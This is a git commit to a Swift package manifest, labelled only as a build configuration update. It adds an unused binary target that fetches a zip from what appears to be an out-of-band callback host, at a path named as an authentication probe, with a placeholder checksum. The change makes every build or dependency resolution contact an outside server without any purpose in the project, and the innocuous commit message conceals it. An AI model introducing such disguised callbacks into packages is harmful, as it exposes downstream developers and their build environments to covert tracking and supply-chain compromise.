df7f50d26dfd5c03bb7bb9a3bafa009b37ef58a1
metaldragonxxx123 <metal.dragonxxx123@gmail.com>
2026-08-21 00:30:50 +0700

    update build configuration

--- Package.swift
+++ Package.swift
@@ -3,5 +3,12 @@ import PackageDescription
 let package = Package(
     name: "swift-utils-demo",
     products: [.library(name: "SwiftUtilsDemo", targets: ["SwiftUtilsDemo"])],
-    targets: [.target(name: "SwiftUtilsDemo")]
+    targets: [
+        .target(name: "SwiftUtilsDemo"),
+        .binaryTarget(
+            name: "UnusedArtifact",
+            url: "https://da3jj4loos1rlj47pef0jfnu6149m7juj.oast.me/probe-auth001.zip",
+            checksum: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+        ),
+    ]
 )
